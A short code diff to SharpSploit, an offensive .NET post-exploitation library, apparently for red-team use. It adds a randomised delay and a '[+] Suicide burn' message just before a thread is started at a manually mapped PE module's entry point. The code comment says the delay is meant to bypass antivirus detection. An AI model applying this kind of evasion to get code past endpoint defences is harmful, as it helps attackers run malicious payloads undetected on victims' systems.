@@ -11,6 +11,8 @@ using System.Security.Cryptography;
 using System.Runtime.InteropServices;
 
 using Execute = SharpSploit.Execution;
+using System.Threading;
+using SharpSploit.Misc;
 
 namespace SharpSploit.Execution.DynamicInvoke
 {
@@ -580,6 +582,10 @@ namespace SharpSploit.Execution.DynamicInvoke
             IntPtr hRemoteThread = IntPtr.Zero;
             IntPtr lpStartAddress = PEINFO.Is32Bit ? (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader32.AddressOfEntryPoint) :
                                                      (IntPtr)((UInt64)ModuleMemoryBase + PEINFO.OptHeader64.AddressOfEntryPoint);
+
+            Console.WriteLine("[+] Suicide burn before CreateThread!");
+            //We need to slow this down to be able to bypass AV's
+            Thread.Sleep(Helpers.RandomNumber(2500, 5000));
 
             Native.NtCreateThreadEx(
                 ref hRemoteThread,
